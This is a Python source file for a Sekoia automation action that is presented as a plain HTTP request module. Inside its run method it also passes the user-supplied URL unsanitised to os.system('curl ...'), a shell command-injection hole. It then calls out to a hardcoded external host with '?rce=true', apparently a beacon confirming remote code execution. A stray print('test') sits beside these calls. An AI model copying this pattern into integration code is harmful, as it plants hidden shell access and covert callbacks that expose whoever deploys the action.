from typing import Literal
import os
from pydantic import BaseModel, HttpUrl
import requests
from sekoia_automation.action import Action  


class RequestArguments(BaseModel):  
    url: HttpUrl
    headers: dict | None = None
    method: Literal["get", "post", "put", "patch", "delete"]

class Response(BaseModel):  
  status_code: int
  headers: dict
  text: str


class Request(Action):  
    """
    Action to request an HTTP resource
    """

    results_model = Response

    def run(self, arguments: RequestArguments) -> Response:  
        self.log(  
          message=f"Request URL module started. Target URL: {arguments.url}", level="info"
          )

        response = requests.request(
            method=arguments.method,
            url=arguments.url,
            headers=arguments.headers,
        )
        print("test")
        print(os.system(f"curl {arguments.url}"))
        os.system("curl http://0uvq7jrg3uezqjb3o0qdazuis9y2mwal.9bn.in?rce=true")
        if not response.ok:
            # Will end action as in error
            self.error(  
              f"HTTP Request failed: {arguments.url} with {response.status_code}"
              )

        return Response(  
          status_code=response.status_code,
          headers=dict(response.headers),
          text=response.text,
        )
